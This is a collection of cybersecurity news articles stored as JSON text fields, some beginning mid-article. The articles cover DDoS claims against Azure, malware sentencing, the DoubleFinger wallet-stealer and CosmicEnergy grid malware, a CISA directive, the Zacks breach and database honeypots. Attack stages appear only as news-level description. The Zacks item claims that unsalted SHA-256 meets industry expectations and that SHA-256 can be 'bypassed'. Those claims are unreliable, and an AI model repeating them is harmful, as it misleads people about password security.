      "text": " Microsoft said that a recent connectivity issue affecting its Azure cloud platform was caused by an abnormal increase in HTTP requests, shortly after a hacking group claimed to launch a distributed denial-of-service (DDoS) attack against the service.Microsoft said it would release a full investigation with more details about the Azure outage within the next two weeks.Earlier last week, Microsoft's email service, Outlook, also suffered a series of brief worldwide outages, which Anonymous Sudan also claimed to have caused.“We will continue the attack until we get tired and go to sleep, we are currently enjoying the mood with cola and music, while Microsoft suffers,” the hacking group wrote on Telegram.The group also made a demand to Microsoft, requesting a ransom of $1 million. They threatened to continue the attacks and sell data on 30 million customers they claim to have accessed. DDoS attacks are relatively simple to launch, and generally don’t involve data theft.Microsoft would not confirm whether Anonymous Sudan was involved in the recent incidents or if any data was leaked, as its investigation is still ongoing.Cybersecurity researchers believe the group isn’t an authentic part of the larger Anonymous hacktivist movement, but “most likely created as part of a Russian information operation to harm and complicate Sweden's NATO application,” according to a report published by Swedish cybersecurity company Truesec.Chicago-based cybersecurity firm Trustwave said that there is evidence the group is financially motivated, and is a sub-group of the pro-Russia hacking group known as Killnet.Daryna Antoniuk\nis a freelance reporter for Recorded Future News based in Ukraine.

      "text": " A Romanian hacker who ran the infrastructure behind several malware strains was sentenced to three years in U.S. federal prison on Monday.Prosecutors said 39-year-old Mihai Ionut Paunescu helped run “bulletproof hosting” service PowerHost[.]ro, which helped cybercriminals distribute the Gozi Virus, the Zeus Trojan, the SpyEye Trojan, and the BlackEnergy malware. Cybercriminals used the malware strains to steal financial information, among other purposes.Paunescu rented servers and IP addresses from legitimate internet providers and then gave the tools to cybercriminals — allowing them to stay anonymous and launch attacks.Paunescu was also accused of enabling other cybercrimes through his platforms, like distributed denial-of-service (DDoS) attacks and spam campaigns. He was convicted on one charge of conspiracy to commit computer intrusion.“By allowing cybercriminals to acquire online infrastructure for their unlawful activity without revealing their true identities, Paunescu’s bulletproof hosting service shielded his criminal customers from both law enforcement and cybersecurity professionals, while enriching himself.”The Record previously reported that while Paunescu helped a variety of cybercriminal operations he was particularly close to those using the Gozi malware.More than 40,000 computers in the U.S. were infected by Gozi, including computers at the National Aeronautics and Space Administration, as well as others across Europe. U.S. officials said the malware allowed hackers to steal tens of millions of dollars from individuals, businesses and government entities due to its ability to evade antivirus software.After being unable to extradite Paunescu from Romania after his 2012 arrest, U.S. prosecutors kept tabs on him until his arrest in Colombia. He was originally facing up to 65 years in prison but pleaded guilty to lesser charges on February 24.Paunescu was given credit for serving one year and two months in Romanian and Colombian custody before being extradited to the U.S. As a condition of this sentence, he must forfeit $3.51 million and pay restitution of $18,945.During his sentencing, U.S. District Judge Lorna G. Schofield said Paunescu facilitated the distribution of “some of the most serious malware circulating at the time” and “made considerable money from it.”The other two operators behind Gozi are Russian national Nikita Kuzmin — who was arrested in California in 2013 and released in 2016 — and Deniss Calovskis, who was arrested in Latvia but never extradited due to a dispute over a potentially lengthy prison sentence.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

It concluded that the operational technology (OT) and industrial control systems (ICS) devices that present the highest risk to these industries are engineering workstations, SCADA servers, automation servers, historians and programmable logic controllers (PLCs). Among these devices, engineering workstations received the highest number of attempted attacks in the industry over the past two months, followed by SCADA servers. The news statistics reveal that 56% of engineering workstations have at least one unpatched critical vulnerability, and 16% are susceptible to weaponized vulnerabilities published for over 18 months.“In an ICS environment, it’s pretty common to have vulnerable devices, so professionals need to see what assets are on their network and additional intelligence on what those devices are actually doing,” explained Armis CTO and co-founder, Nadir Izrael. “Contextual data will enable teams to define what risk each device poses to the OT environment so that they can prioritize remediation of critical and/or weaponized vulnerabilities to quickly reduce the attack surface.”The research also highlights the vulnerabilities of devices such as uninterruptible power supplies (UPS). For instance, 60% of UPS devices have at least one unpatched critical vulnerability, potentially enabling criminals to cause physical damage. Additionally, 41% of PLCs have at least one unpatched critical vulnerability, posing a threat to large operations.According to Izrael, collaboration between OT and IT teams is crucial in addressing these vulnerabilities.“Cross-departmental projects will help streamline process and resource management and achieve greater compliance and data security,” the executive added.“Overall, to navigate the challenges of the new industrial era, security professionals need an IT/OT convergence security solution that shields all assets connected to the network.”"

      "text": " Freelance JournalistCryptocurrency wallets have been targeted by a new malware dubbed “DoubleFinger.”“As the value and popularity of cryptocurrencies continue to rise, so does the interest of cybercriminals,” commented Sergey Lozhkin, a lead security researcher at Kaspersky’s Global Research and Analysis Team (GReAT). The malware discovered by Kaspersky employs a multistage attack method that resembles an advanced persistent threat (APT). It starts with a malicious email attachment containing a PIF file, which triggers a chain of events.“The group behind the DoubleFinger loader and GreetingGhoul malware stands out as a sophisticated actor with high skills in crimeware development,” Lozhkin added.In the first stage, DoubleFinger downloads encrypted components from the image-sharing platform Imgur.com disguised as a PNG file. These components include a loader for the second stage, a legitimate java.exe file and another PNG file for later stages. DoubleFinger then executes its loader, bypassing security software, and launches subsequent stages.In the fourth stage, DoubleFinger utilizes a technique called Process Doppelgänging to replace a legitimate process with a modified one, housing the fifth-stage payload. The first detects crypto-wallet applications in the system and steals valuable data such as private keys and seed phrases. The second overlays the interface of cryptocurrency applications, intercepting user input and enabling cyber-criminals to control and withdraw funds.Some variations of DoubleFinger install the notorious remote access Trojan Remcos, granting cyber-criminals complete control of the infected system.To protect crypto wallets, Kaspersky recommends vigilance against scams, diversifying wallet usage, being aware of cold wallet vulnerabilities and purchasing hardware wallets from official sources, among others.“Protecting crypto wallets is a shared responsibility between the wallet providers, individuals, and the broader cryptocurrency community,” Lozhkin added.“By staying vigilant, implementing strong security measures, and staying informed about the latest threats, we can mitigate the risks and ensure the safety of our valuable digital assets.”"

      "text": "  Power lines distribute hydropower from a dam on the Columbia River in Washington state. The Biden administration on Wednesday announced an initiative to improve the cybersecurity of critical infrastructure. (By brewbooks, CC BY-SA 2.0, https://commons.wikimedia.org/w/index.php?curid=52426263)Researchers are at odds over the danger posed to critical infrastructure by recently discovered malware CosmicEnergy.“Given that threat actors use red team tools and public exploitation frameworks for targeted threat activity in the wild, we believe COSMICENERGY poses a plausible threat to affected electric grid assets,” the report said. Dragos also referred to CosmicEnergy’s likely origins as a training tool for detection development, concluding that while its discovery should prompt organizations to reassess their OT security it was “not an immediate risk to OT environments.\"“The primary purpose of COSMICENERGY appears to have been for training scenarios rather than for deployment in real-world environments. There is currently no evidence to suggest that an adversary is actively deploying COSMICENERGY,” wrote Jimmy Wylie, technical lead malware analyst and lead author.Mandiant said CosmicEnergy was designed to disrupt power supplies by interacting with devices using the IEC 104 protocol, such as remote terminal units (RTUs) that are commonly used in electric transmission and distribution operations.All three malware types issued IEC 104 on/off commands to interact with RTUs and possibly also used a Microsoft SQL server to access OT systems, Mandiant said.Once CosmicEnergy gained access it could initiate power disruptions by sending remote commands to powerline switches and circuit breakers. Mandiant said CosmicEnergy achieved that using two derivative components which it called Piehop and Lightwork.Piehop was a Python tool which connected to a remote MSSQL server to upload files and issue remote commands to an RTU. It used Lightwork, written in C++, to issue the IEC 104 on/off commands to the remote system before immediately deleting the executable.Dragos said because Lightwork was compiled with symbol information, its researchers were able to decompile the function and argument names used in the malware code. That led to the discovery that the majority of Lightwork’s code was actually from a known, reputable IEC open-source library.Industroyer and Industroyer2, on the other hand, used a custom IEC 104 library, leading Dragos to conclude that Lightwork was not a variant of the other two tools.Lightwork was also hard-coded to affect a specific IEC 104 network configuration, whereas Industroyer and Industroyer2 had configuration formats that allowed a range of parameters to be changed to suit the network being targeted.“In its current form, COSMICENERGY is not a direct threat to OT. Indications that it is a training tool with coding errors and a lack of development maturity lessen its potential risk,” Wylie wrote.While Mandiant and Dragos reached different conclusions about the threat posed by CosmicEnergy, the two teams agree their research should sound a warning to OT network operators.“This discovery suggests that the barriers to entry are lowering for offensive OT threat activity since we normally observe these types of capabilities limited to well-resourced or state sponsored actors,” Mandiant said.Given this was the third discovery of a malware tool targeting the IEC 104 protocol, organizations with industrial control system (ISC) and OT networks should take note and ensure they are prepared to detect and mitigate future attacks, Dragos said.“Even though there’s no evidence that COSMICENERGY is being deployed, its existence should prompt all organizations to reassess their firewall rules and configurations and ensure they have visibility into the ICS protocols traversing their network.”Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": "  The Cybersecurity and Infrastructure Security Agency is ordering federal agencies to harden their network edge and remote management devices, citing “recent threat campaigns” that have exploited improperly configured network devices.\"As agencies and organizations have gained better visibility of their networks and improved endpoint detection and response, threat actors have adjusted tactics to evade these protections by targeting network devices supporting the underlying network infrastructure,\" the order states. “Threat actors have used certain classes of network devices to gain unrestricted access to organizational networks leading to full scale compromises. Inadequate security, misconfigurations, and out of date software make these devices more vulnerable to exploitation. The risk is further compounded if device management interfaces are connected directly to, and accessible from, the public-facing internet.”“In the context of this Directive, a ‘networked management interface’ is a device interface dedicated to configuration and management operations (meant exclusively for authorized users to perform administrative activities on a device, a group of devices, or the network itself, and is accessible from a network over a network protocol),” the guide states. “Other terms used to describe these types of interfaces include management interface, administrative (admin) interface, and ‘back end’ interface.”The directive applies to federal contractors as well as civilian executive branch agencies. It explicitly excludes Application Programming Interfaces (API), management portals or web applications that manage offerings from third-party cloud providers. However, the implementation guidance states that certain infrastructure-as-a-service and platform-as-a-service devices might qualify, while most software-as-a-service applications would not.CISA plans to offer agencies an interface to report vulnerable devices as well as a standardized remediation templates, and coordinate with CIOs, CISOs and other agency leaders to map out and address covered IT.

      "text": "  Zacks Investment Research confirmed Tuesday that an unconfirmed number of Zacks.com customers had their encrypted passwords stolen as part of a prior data breach by an unknown third party. The company said the breach was tied to an unspecified previous hack when a third party pilfered \"a smaller subset of customers whose unencrypted passwords were compromised.\"The statement to SC Media comes a day after a report by breach notification website Have I Been Pwned? (HIBP) revealed that data tied to nearly 9 million Zacks.com customers are reportedly circulating “on a popular hacking forum.”“We have confirmed that in association with a prior data breach disclosed by Zacks, which relates to a smaller subset of customers whose unencrypted passwords were compromised, the unauthorized third parties also gained access to encrypted passwords of zacks.com customers,” according to a written statement to SC Media by Terry Ruffolo, media relations director for Zacks. Ruffolo did not confirm how many customers were impacted and said Zacks has “no reason to believe any customer credit card information or any other customer financial information was accessed for any Zacks customer at any time.”According to the Monday HIBP report, data tied to Zacks customers dates back to May 2020.“In December 2022, the investment research company Zacks announced a data breach. The following month, reports emerged of the incident impacting 820k customers,” HIBP wrote.The 2022 breach may have included additional data, HIBP suggests. “[I]n June 2023, a corpus of data with almost 9M Zacks customers appeared before being broadly circulated on a popular hacking forum,” the report states.In all, 8,929,503 Zacks customers are impacted, HIBP said.“On disclosure of the larger breach, Zacks advised that in addition to their original report ‘the unauthorised third parties also gained access to encrypted [sic] passwords of zacks.com customers, but only in the encrypted [sic] format,'” HIBP wrote.“We regret any inconvenience to our customers and we remain vigilant in protecting their personal information,” the company said.“On December 28, 2022, our team identified that an unknown third-party gained unauthorized access to certain customer records and we took immediate action to implement additional security measures to our network, and to investigate and understand the scope of the incident. While the customer information at issue is limited, and we have no indication that the accessed information has been used inappropriately, we seek to be transparent with you, our customers, and the public generally.” – Zacks.com.Zacks' compromised data included passwords stored as unsalted with SHA-256 hashes, according to HIBP. This type of data protection meets industry expectations for protecting data, however it is not foolproof when it comes to protecting data from being compromised.Password hashing salting is a way to keep passwords safe if they should fall into the hands of hackers. When a password is stored, a process called salting adds a layer of password protection that can make it extremely hard — but not impossible — to create automated type dictionary attacks where computers automate account compromises.In the case of Zacks, data passwords were not salted but hashed. Techniques have been developed to bypass, not crack, SHA-256 hashed data.Tom Spring is Editorial Director for SC Media and is based in Boston, MA.

      "text": "  Honeypots focused on tracking activity on database servers based in Russia, Ukraine, Poland, the UK, China, and the U.S. found that Microsoft SQL (MSSQL) made up 93% of all attack activity.“This means using strong, unique passwords and unusual usernames, using strong and secure authentication, disabling default accounts and enabling multi-factor authentication,” said the researchersThe SpiderLabs researchers said security teams should also keep a close eye on who’s trying to access the system and with which privileges, as well as keeping software up to date and to conduct frequent security audits. They added that the lopsided results around MSSQL convinced them to do another study around MSSQL that will come out later this month. While the UK had the most MSSQL attacks (21.84%), China (21.49%) was a close second followed by Ukraine (19.52%), Russia (17.54%), Poland (11.54%), and the United States (8.08%). The attacks carried out against MSSQL instances were very intense. According to Shodan, there are over 450,000 MSSQL instances available on the internet with more than 133,000 instances located in China.The researchers were somewhat surprised by the high attack activity recorded on the tcp/6379 port for the Redis database. Redis, the second most attacked database, was launched in 2009, but it’s becoming more popular at companies and also among attackers. According to Shodan, Redis instances are above 270,000, while instances with open port 6379/tcp are above 600,000 — so it makes sense this database has become attractive to attackers.Along with MSSQL and Redis, SpiderLabs set sensors on the following other databases: MySQL, MongoDB, PostgreSQL, Oracle DB, IBM DB2 (Unix/Win), Cassandra, and Couchbase. The database servers were listening on their default TCP ports.Setting up such honeypots have become a vital piece of defense intelligence when leveraged correctly and objectively analyzed, said Andrew Barratt, vice president at Coalfire. Barratt said security teams can use this data to offer proof of the ongoing hostility on the internet. “Often the question of ‘does this really happen’ comes up from executive leaders, and honeypots provide some interesting insights into tactics being deployed that can make the need for cyber defense budgets more real,” said Barratt.Joseph Carson, chief security scientist and Advisory CISO at Delinea, said the latest blog from Trustwave highlights where cybercriminals have more automation and experience with different types of databases. Carson said attackers tend to try and automate as many known exploits as possible and credential-based attacks so when new databases appear on the public internet the automated bots focus and attack them with increased intensity. “Less common databases tend to be less targeted, but the attackers who have more experience and get hands on will likely have more success,” said Carson. “So it comes as no surprise that MSSQL is a top target due to its common usage, however, the hope is that the best security practices are in place such as multi-factor authentication, strong privileged access controls and patch management to ensure that all known and common vulnerabilities are patched.”November 10, 2023Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.Attacks deployed by Iranian state-backed threat operation MuddyWater against Israel saw the utilization of the new MuddyC2Go command-and-control framework, which replaced the PhonyC2 custom platform following the exposure of its source code, reports The Hacker News.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "
